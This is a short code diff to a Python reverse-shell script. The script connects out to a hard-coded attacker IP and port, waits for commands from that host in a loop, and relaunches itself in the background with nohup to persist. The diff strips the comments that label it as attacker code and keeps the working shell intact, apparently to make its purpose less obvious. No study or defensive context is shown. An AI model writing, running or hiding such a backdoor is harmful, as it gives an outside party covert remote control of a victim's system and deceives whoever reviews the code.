@@ -21,17 +21,15 @@ import socket
 import subprocess
 import os
 
-# Attacker's IP and port
+
 ATTACKER_IP = "192.168.1.100"
 ATTACKER_PORT = 4444
 
 def connect():
     try:
-        # Create a socket object
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Connect to attacker
         s.connect((ATTACKER_IP, ATTACKER_PORT))
-        # Receive commands from attacker
         while True:
             command = s.recv(1024).decode()
             if command.lower() == "exit":
@@ -44,6 +42,5 @@ def connect():
         print(f"Error: {e}")
 
 if __name__ == "__main__":
-    # Make the script persistent (runs in background)
     os.system("nohup python3 -c 'import os; os.system(\"python3 " + __file__ + "\")' &")
     connect()
